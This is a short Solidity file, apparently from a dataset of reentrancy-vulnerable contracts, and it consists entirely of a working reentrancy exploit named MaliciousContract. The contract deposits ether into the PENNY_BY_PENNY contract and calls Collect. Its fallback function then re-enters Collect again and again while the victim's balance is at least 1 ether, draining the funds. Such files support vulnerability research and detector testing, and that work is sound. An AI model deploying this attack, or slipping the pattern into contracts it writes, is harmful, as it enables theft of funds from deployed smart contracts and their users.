pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol";

contract MaliciousContract {
    PENNY_BY_PENNY penny_by_penny;

    constructor(address _victimAddress) public {
        penny_by_penny = PENNY_BY_PENNY(_victimAddress);
    }

    function attack(uint256 amount) public {
        require(amount >= 1 ether, "Must send at least 1 ether");
        penny_by_penny.Collect(amount);
    }

    function deposit(uint256 timeLock) public payable {
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        penny_by_penny.Put.value(msg.value)(timeLock);
    }

    function() public payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(penny_by_penny).balance >= 1 ether) {
            penny_by_penny.Collect(1 ether);
        }
    }
}
